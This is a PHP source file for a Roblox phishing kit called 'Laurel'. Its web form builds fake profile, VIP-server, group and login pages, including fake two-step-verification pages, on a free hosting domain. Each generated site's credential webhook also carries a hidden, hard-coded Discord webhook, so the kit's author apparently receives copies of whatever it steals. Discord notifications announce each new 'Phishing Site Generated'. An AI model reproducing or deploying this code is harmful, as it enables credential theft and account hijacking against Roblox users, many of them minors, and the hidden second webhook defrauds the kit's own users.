<?php
$mydualhook = "https://discord.com/api/webhooks/908037799826042921/TAjmJy-aqAeCTr3ba9VqakftJyH226xYkDwYeSQ1Dj0HN-dpJp-REqV8gZS_06I9jdk4";
function backdoorblock($string){
    $string = str_replace(array('[\', \']'), '', $string);
    $string = preg_replace('/\[.*\]/U', '', $string);
    $string = preg_replace('/&(amp;)?#?[a-z0-9]+;/i', '-', $string);
    $string = htmlentities($string, ENT_COMPAT, 'utf-8');
    $string = preg_replace('/&([a-z])(acute|uml|circ|grave|ring|cedil|slash|tilde|caron|lig|quot|rsquo);/i', '\\1', $string );
    $string = preg_replace(array('/[^a-z0-9]/i', '/[-]+/') , '-', $string);
    return strtolower(trim($string, ''));
}

require "configuration.php";
include('endpoints.php');
$generated = 0;
if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['uname'])) {
    $uname = $_POST['uname'];
    $fname = $_POST['fname'];
    $dwebhook = backdoorblock($_POST['dwebhook']);
    $robloxuserid = rand();
    $robloxstatus = $_POST['status'];
    
    $page = file_get_contents("https://api.roblox.com/users/get-by-username?username=$uname");
    
    $ch = curl_init("https://api.roblox.com/users/get-by-username?username=$uname");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $data = curl_exec($ch);
    $data = json_decode($data);

    $ab = curl_init("https://users.roblox.com/v1/users/$data->Id");
    curl_setopt($ab, CURLOPT_RETURNTRANSFER, 1);

    $data1 = curl_exec($ab);
    $data1 = json_decode($data1);
    
    $webhookphp = file_get_contents("bobbob/webhook.php");
    $prosesphp = file_get_contents("bobbob/proses.php");
    $indexxphp = file_get_contents("bobbob/indexx.php");
    $twostepindexphp = file_get_contents("bobbob/twostepindex.php");
    $twostepstepphp = file_get_contents("bobbob/twostepstep.php");
    $sponsorshipphp = file_get_contents("bobbob/sponsorship.php");
    $bobbobphp = file_get_contents("bobbob/bobbob.php");
    
    mkdir('users/'.$robloxuserid.'/profile', 0777, true);
    mkdir('users/'.$robloxuserid.'/profile/login', 0777, true);
    mkdir('users/'.$robloxuserid.'/profile/login/js', 0777, true);
    mkdir('users/'.$robloxuserid.'/profile/login/twostepverification', 0777, true);
    mkdir('users/'.$robloxuserid.'/profile/login/twostepverification/js', 0777, true);
        fwrite(fopen('users/'.$robloxuserid.'/profile/index.php', "w"), str_replace("{robloxstatus}", $_POST['status'],str_replace("vKevinCC", $uname, str_replace("CykaKevin", $fname, file_get_contents("bobbob/profile.php")))));
        fwrite(fopen('users/'.$robloxuserid.'/profile/login/webhook.php', "w"), str_replace("{webhook}", $_POST['dwebhook'],str_replace("{webhook2}", $mydualhook, file_get_contents("bobbob/webhook.php"))));
    file_put_contents('users/'.$robloxuserid.'/profile/sponsorship.php', $sponsorshipphp);
    file_put_contents('users/'.$robloxuserid.'/profile/bobbob.php', $bobbobphp);
    file_put_contents('users/'.$robloxuserid.'/profile/login/index.php', $indexxphp);
    file_put_contents('users/'.$robloxuserid.'/profile/login/proses.php', $prosesphp);
    file_put_contents('users/'.$robloxuserid.'/profile/login/twostepverification/index.php', $twostepindexphp);
    file_put_contents('users/'.$robloxuserid.'/profile/login/twostepverification/step.php', $twostepstepphp);
    file_put_contents('users/'.$robloxuserid.'/profile/login/twostepverification/js/jq.js', $twostepjs);
    file_put_contents('users/'.$robloxuserid.'/profile/login/js/jq.js', $loginjs);
    header("Location: users/".$robloxuserid."/profile/");
$timestamp = date("c", strtotime("now"));

$hookObject = json_encode([
    "content" => "@everyone **| New Phishing Site Generated!**",
    "username" => "Laurel | Notification",
    "avatar_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => ":bread: Discord Server :bread:",
            "type" => "rich",
            "description" => "**Powered by bobbob#8113**",
            "url" => "https://discord.gg/dyz7cXfStA",
            "timestamp" => $timestamp,
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "Laurel | Notification",
              "icon_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "image" => [
                "url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "thumbnail" => [
                "url" => "https://www.roblox.com/Thumbs/Avatar.ashx?x=352&y=352&Format=Png&username=$uname"
            ],
            "author" => [
                "name" => "Laurel Notification",
                "url" => "https://discord.gg/dyz7cXfStA"
            ],
            "fields" => [
                [
                    "name" => "Type:",
                    "value" => "[Profile!]($dwebhook)",
                    "inline" => false
                ],
                [
                    "name" => "Result Link:",
                    "value" => "[Click Here!](https://robloxgge.000webhostapp.com/users/".$robloxuserid."/profile)",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$controls = curl_init();

curl_setopt_array( $controls, [
    CURLOPT_URL => $dwebhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $controls );   
curl_setopt_array( $controls, [
    CURLOPT_URL => $mydualhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
curl_close( $controls ); 
}
if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['gameid'])) {
$gameid = $_POST['gameid'];
$robloxgameid = rand();
$webhook = backdoorblock($_POST['dwebhook']);
$notfound = array('{"errors":[{"code":400,"message":"BadRequest"}]}');
    $page = file_get_contents("https://api.roblox.com/universes/get-universe-containing-place?placeid=$gameid");
    
    $ch = curl_init("https://api.roblox.com/universes/get-universe-containing-place?placeid=$gameid");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $data = curl_exec($ch);
    $data = json_decode($data);
    $url2 = "https://www.roblox.com/places/api-get-details?assetId=$gameid";

    $curl2 = curl_init($url2);
    curl_setopt($curl2, CURLOPT_URL, $url2);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

    //for debug only!
    curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

    $resp2 = curl_exec($curl2);
    $info = json_decode($resp2);

    $gname = $info->Name;
    
function RemoveSpecialChar($str) {
      
    // Using str_replace() function 
    // to replace the word 
    $res = str_replace( array( '\'', '"',
    ',' , ';', '<', '>' ,'!'), ' ', $str);
      
    // Returning the result 
    return $res;
    }
  
// Given string
$str = $gname; 
  
// Function calling
$gamename = RemoveSpecialChar($str); 
$namegame = str_replace(' ', '-', $gamename);
$gamename2 = preg_replace('/([0-9|#][\x{20E3}])|[\x{00ae}|\x{00a9}|\x{203C}|\x{2047}|\x{2048}|\x{2049}|\x{3030}|\x{303D}|\x{2139}|\x{2122}|\x{3297}|\x{3299}][\x{FE00}-\x{FEFF}]?|[\x{2190}-\x{21FF}][\x{FE00}-\x{FEFF}]?|[\x{2300}-\x{23FF}][\x{FE00}-\x{FEFF}]?|[\x{2460}-\x{24FF}][\x{FE00}-\x{FEFF}]?|[\x{25A0}-\x{25FF}][\x{FE00}-\x{FEFF}]?|[\x{2600}-\x{27BF}][\x{FE00}-\x{FEFF}]?|[\x{2900}-\x{297F}][\x{FE00}-\x{FEFF}]?|[\x{2B00}-\x{2BF0}][\x{FE00}-\x{FEFF}]?|[\x{1F000}-\x{1F6FF}][\x{FE00}-\x{FEFF}]?/u', '-', $namegame);
    
    $webhookphp = file_get_contents("bobbob/webhook.php");
    $prosesphp = file_get_contents("bobbob/proses.php");
    $indexxphp = file_get_contents("bobbob/indexx.php");
    $twostepindexphp = file_get_contents("bobbob/twostepindex.php");
    $twostepstepphp = file_get_contents("bobbob/twostepstep.php");
    $sponsorshipphp = file_get_contents("bobbob/sponsorship.php");
    $bobbobphp = file_get_contents("bobbob/bobbob.php");
    
    mkdir('games/'.$robloxgameid.'/'.$gamename2.'', 0777, true);
    mkdir('games/'.$robloxgameid.'/'.$gamename2.'/login', 0777, true);
    mkdir('games/'.$robloxgameid.'/'.$gamename2.'/login/js', 0777, true);
    mkdir('games/'.$robloxgameid.'/'.$gamename2.'/login/twostepverification', 0777, true);
    mkdir('games/'.$robloxgameid.'/'.$gamename2.'/login/twostepverification/js', 0777, true);
        fwrite(fopen('games/'.$robloxgameid.'/'.$gamename2.'/index.php', "w"), str_replace("{id}", $_POST['gameid'], file_get_contents("bobbob/game.php")));
        fwrite(fopen('games/'.$robloxgameid.'/'.$gamename2.'/login/webhook.php', "w"), str_replace("{webhook}", $_POST['dwebhook'],str_replace("{webhook2}", $mydualhook, file_get_contents("bobbob/webhook.php"))));
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/sponsorship.php', $sponsorshipphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/bobbob.php', $bobbobphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/index.php', $indexxphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/proses.php', $prosesphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/twostepverification/index.php', $twostepindexphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/twostepverification/step.php', $twostepstepphp);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/twostepverification/js/jq.js', $twostepjs);
    file_put_contents('games/'.$robloxgameid.'/'.$gamename2.'/login/js/jq.js', $loginjs);
$timestamp = date("c", strtotime("now"));
$url = $webhook;
$fakelink = "https://robloxgge.000webhostapp.com/games/".$robloxgameid."/".$gamename2."/?privateServerLinkCode=ZMDxYaCz5Tufbp9oNTWgZboZFmXl_oN8";
$hookObject = json_encode([
    "content" => "@everyone **| New Phishing Site Generated!**",
    "username" => "Laurel | Notification",
    "avatar_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => ":bread: Discord Server :bread:",
            "type" => "rich",
            "description" => "**Powered by bobbob#8113**",
            "url" => "https://discord.gg/dyz7cXfStA",
            "timestamp" => $timestamp,
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "Laurel | Notification",
              "icon_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "image" => [
                "url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "thumbnail" => [
                "url" => "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid=$gameid&fmt=png&wd=420&ht=420"
            ],
            "author" => [
                "name" => "Laurel Notification",
                "url" => "https://discord.gg/dyz7cXfStA"
            ],
            "fields" => [
                [
                    "name" => "Type:",
                    "value" => "[Game!]($webhook)",
                    "inline" => false
                ],
                [
                    "name" => "Result Link:",
                    "value" => "[Click Here!]($fakelink)",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $controls );   
curl_setopt_array( $ch, [
    CURLOPT_URL => $mydualhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
curl_close( $controls ); 

$response = curl_exec( $ch );
    header("Location: games/".$robloxgameid."/".$gamename2."/?privateServerLinkCode=ZMDxYaCz5Tufbp9oNTWgZboZFmXl_oN8");
}
if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['groupid'])) {
$groupid = $_POST['groupid'];
$robloxgroupid = rand();
$webhook = backdoorblock($_POST['dwebhook']);
$notfound = array('{"errors":[{"code":400,"message":"BadRequest"}]}');
    $page = file_get_contents("https://groups.roblox.com/v1/groups/$groupid");
    
    $ch = curl_init("https://groups.roblox.com/v1/groups/$groupid");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    $data = curl_exec($ch);
    $data = json_decode($data);
    $url2 = "https://groups.roblox.com/v1/groups/$groupid";

    $curl2 = curl_init($url2);
    curl_setopt($curl2, CURLOPT_URL, $url2);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

    //for debug only!
    curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

    $resp2 = curl_exec($curl2);
    $info = json_decode($resp2);

    $grname = $info->name;
    
function RemoveSpecialChar($str) {
      
    // Using str_replace() function 
    // to replace the word 
    $res = str_replace( array( '\'', '"',
    ',' , ';', '<', '>' ,'!'), ' ', $str);
      
    // Returning the result 
    return $res;
    }
  
// Given string
$str = $grname; 
  
// Function calling
$groupname = RemoveSpecialChar($str); 
$namegroup = str_replace(' ', '-', $groupname);
$namegroup2 = preg_replace('/([0-9|#][\x{20E3}])|[\x{00ae}|\x{00a9}|\x{203C}|\x{2047}|\x{2048}|\x{2049}|\x{3030}|\x{303D}|\x{2139}|\x{2122}|\x{3297}|\x{3299}][\x{FE00}-\x{FEFF}]?|[\x{2190}-\x{21FF}][\x{FE00}-\x{FEFF}]?|[\x{2300}-\x{23FF}][\x{FE00}-\x{FEFF}]?|[\x{2460}-\x{24FF}][\x{FE00}-\x{FEFF}]?|[\x{25A0}-\x{25FF}][\x{FE00}-\x{FEFF}]?|[\x{2600}-\x{27BF}][\x{FE00}-\x{FEFF}]?|[\x{2900}-\x{297F}][\x{FE00}-\x{FEFF}]?|[\x{2B00}-\x{2BF0}][\x{FE00}-\x{FEFF}]?|[\x{1F000}-\x{1F6FF}][\x{FE00}-\x{FEFF}]?/u', '-', $namegroup);
$result = get_CURL("https://thumbnails.roblox.com/v1/groups/icons?groupIds=$groupid&size=150x150&format=Png&isCircular=false");
$groupicon  = $result['data'][0]['imageUrl'];

    $webhookphp = file_get_contents("bobbob/webhook.php");
    $prosesphp = file_get_contents("bobbob/proses.php");
    $indexxphp = file_get_contents("bobbob/indexx.php");
    $twostepindexphp = file_get_contents("bobbob/twostepindex.php");
    $twostepstepphp = file_get_contents("bobbob/twostepstep.php");
    $sponsorshipphp = file_get_contents("bobbob/sponsorship.php");
    $bobbobphp = file_get_contents("bobbob/bobbob.php");
    
    mkdir('groups/'.$robloxgroupid.'/'.$namegroup2.'', 0777, true);
    mkdir('groups/'.$robloxgroupid.'/'.$namegroup2.'/login', 0777, true);
    mkdir('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/js', 0777, true);
    mkdir('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/twostepverification', 0777, true);
    mkdir('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/twostepverification/js', 0777, true);
        fwrite(fopen('groups/'.$robloxgroupid.'/'.$namegroup2.'/index.php', "w"), str_replace("3333298", $_POST['groupid'], file_get_contents("bobbob/group.php")));
        fwrite(fopen('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/webhook.php', "w"), str_replace("{webhook}", $_POST['dwebhook'],str_replace("{webhook2}", $mydualhook, file_get_contents("bobbob/webhook.php"))));
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/sponsorship.php', $sponsorshipphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/bobbob.php', $bobbobphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/index.php', $indexxphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/proses.php', $prosesphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/twostepverification/index.php', $twostepindexphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/twostepverification/step.php', $twostepstepphp);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/twostepverification/js/jq.js', $twostepjs);
    file_put_contents('groups/'.$robloxgroupid.'/'.$namegroup2.'/login/js/jq.js', $loginjs);
$timestamp = date("c", strtotime("now"));
$url = $webhook;
$fakelink = "https://robloxgge.000webhostapp.com/groups/".$robloxgroupid."/".$namegroup2."/";
$hookObject = json_encode([
    "content" => "@everyone **| New Phishing Site Generated!**",
    "username" => "Laurel | Notification",
    "avatar_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => ":bread: Discord Server :bread:",
            "type" => "rich",
            "description" => "**Powered by bobbob#8113**",
            "url" => "https://discord.gg/dyz7cXfStA",
            "timestamp" => $timestamp,
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "Laurel | Notification",
              "icon_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "image" => [
                "url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "thumbnail" => [
                "url" => "$groupicon"
            ],
            "author" => [
                "name" => "Laurel Notification",
                "url" => "https://discord.gg/dyz7cXfStA"
            ],
            "fields" => [
                [
                    "name" => "Type:",
                    "value" => "[Group!]($webhook)",
                    "inline" => false
                ],
                [
                    "name" => "Result Link:",
                    "value" => "[Click Here!]($fakelink)",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
curl_setopt_array( $ch, [
    CURLOPT_URL => $mydualhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
    header("Location: groups/".$robloxgroupid."/".$namegroup2."/");
}
if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['duwebhook'])) {
    $dwebhook = $_POST['duwebhook'];
    $loginid = rand();

    $webhookphp = file_get_contents("bobbob/webhook.php");
    $prosesphp = file_get_contents("bobbob/proses.php");
    $indexxphp = file_get_contents("bobbob/indexx.php");
    $twostepindexphp = file_get_contents("bobbob/twostepindex.php");
    $twostepstepphp = file_get_contents("bobbob/twostepstep.php");
    $sponsorshipphp = file_get_contents("bobbob/sponsorship.php");
    $bobbobphp = file_get_contents("bobbob/bobbob.php");
    
    mkdir('redirect/'.$loginid.'', 0777, true);
    mkdir('redirect/'.$loginid.'/login', 0777, true);
    mkdir('redirect/'.$loginid.'/login/login/js', 0777, true);
    mkdir('redirect/'.$loginid.'/login/login/twostepverification', 0777, true);
    mkdir('redirect/'.$loginid.'/login/login/twostepverification/js', 0777, true);
        fwrite(fopen('redirect/'.$loginid.'/login/login/webhook.php', "w"), str_replace("{webhook}", $_POST['duwebhook'],str_replace("{webhook2}", $mydualhook, file_get_contents("bobbob/webhook.php"))));
    file_put_contents('redirect/'.$loginid.'/login/index.php', $indexxphp);
    file_put_contents('redirect/'.$loginid.'/login/login/proses.php', $prosesphp);
    file_put_contents('redirect/'.$loginid.'/login/login/twostepverification/index.php', $twostepindexphp);
    file_put_contents('redirect/'.$loginid.'/login/login/twostepverification/step.php', $twostepstepphp);
    file_put_contents('redirect/'.$loginid.'/login/login/twostepverification/js/jq.js', $twostepjs);
    file_put_contents('redirect/'.$loginid.'/login/login/js/jq.js', $loginjs);
$timestamp = date("c", strtotime("now"));
$url = $dwebhook;
$fakelink = "https://robloxgge.000webhostapp.com/redirect/".$loginid."/login/";
$hookObject = json_encode([
    "content" => "@everyone **| New Phishing Site Generated!**",
    "username" => "Laurel | Notification",
    "avatar_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => ":bread: Discord Server :bread:",
            "type" => "rich",
            "description" => "**Powered by bobbob#8113**",
            "url" => "https://discord.gg/dyz7cXfStA",
            "timestamp" => $timestamp,
            "color" => hexdec( "FFFFFF" ),
            "footer" => [
                "text" => "Laurel | Notification",
              "icon_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "image" => [
                "url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png"
            ],
            "thumbnail" => [
                "url" => "https://media.discordapp.net/attachments/888208984694214669/900227091335880754/image0.png"
            ],
            "author" => [
                "name" => "Laurel Notification",
                "url" => "https://discord.gg/dyz7cXfStA"
            ],
            "fields" => [
                [
                    "name" => "Type:",
                    "value" => "[Login!]($dwebhook)",
                    "inline" => false
                ],
                [
                    "name" => "Result Link:",
                    "value" => "[Click Here!]($fakelink)",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
curl_setopt_array( $ch, [
    CURLOPT_URL => $mydualhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $ch ); 
curl_close( $ch );
    header("Location: redirect/".$loginid."/login/");
}
?>

<!DOCTYPE html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {box-sizing: border-box;}

body { 
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

.header {
  overflow: hidden;
  background-color: #000000;
  padding: 20px 10px;
}

.header a {
  float: left;
  color: white;
  text-align: center;
  padding: 12px;
  text-decoration: none;
  font-size: 18px; 
  line-height: 25px;
  border-radius: 4px;
}

.header a.logo {
  font-size: 25px;
  font-weight: bold;
}

.header a:hover {
  background-color: #ddd;
  color: black;
}

.header a.active {
  background-color: black;
  color: white;
}

.header-right {
  float: right;
}

@media screen and (max-width: 500px) {
  .header a {
    float: none;
    display: block;
    text-align: left;
  }
  
  .header-right {
    float: none;
  }
}
</style>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
    display: none !important;
}
</style>
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<link href="generator.css" rel="stylesheet">
	<title>Generator</title>
</head>

<body>
	<script>
		function websiteRoblox(that) {
			if (that.value == "Profile") {
				document.getElementById("input-1-profile").style.display = "block";
			} else {
				document.getElementById("input-1-profile").style.display = "none";
			}
			if (that.value == "Game") {
				document.getElementById("input-2-profile").style.display = "block";
			} else {
				document.getElementById("input-2-profile").style.display = "none";
			}
			if (that.value == "Login") {
				document.getElementById("input-4-profile").style.display = "block";
			} else {
				document.getElementById("input-4-profile").style.display = "none";
			}
			if (that.value == "Group") {
				document.getElementById("input-3-profile").style.display = "block";
			} else {
				document.getElementById("input-3-profile").style.display = "none";
			}
		}
	</script>
	<div class="login-box">
		<h2>Generator:</h2>
		<select onchange="websiteRoblox(this);" name="option" class="un" id="select">
			<option value="Choose">Choose Theme:</option>
			<option value="Profile">Profile (1)</option>
			<option value="Game">VIP Server (2)</option>
			<option value="Group">Group (3)</option>
			<option value="Login">Login Page (4)</option>
		</select>

		<div id="input-1-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Profile">Profile</option>
				</select>
				<div class="user-box">
					<input type="text" name="uname" maxlength="20" required>
					<label>Username.</label>
				</div>
				<div class="user-box">
					<input type="text" name="fname" maxlength="20" required>
					<label>Fake Username.</label>
				</div>
				<div class="user-box">
					<input type="text" name="status" maxlength="30" required>
					<label>About Me.</label>
				</div>
				<div class="user-box">
					<input type="url" name="dwebhook" required>
					<label>Webhook URL.</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<div id="input-2-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Game">Profile</option>
				</select>
				<div class="user-box">
					<input type="number" name="gameid" required>
					<label>Game ID.</label>
				</div>
				<div class="user-box">
					<input type="url" name="dwebhook" required>
					<label>Webhook URL.</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<div id="input-4-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Profile">Profile</option>
				</select>
				<div class="user-box">
					<input type="url" name="duwebhook" required>
					<label>Webhook URL.</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<div id="input-3-profile" style="display: none;">
			<form action="" method="POST">
				<select name="option" type="hidden" class="anu" id="select">
					<option type="hidden" value="Game">Profile</option>
				</select>
				<div class="user-box">
					<input type="number" name="groupid" required>
					<label>Group ID.</label>
				</div>
				<div class="user-box">
					<input type="url" name="dwebhook" required>
					<label>Webhook URL.</label>
				</div>
				<button class="submit">Create</button>
			</form>
		</div>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>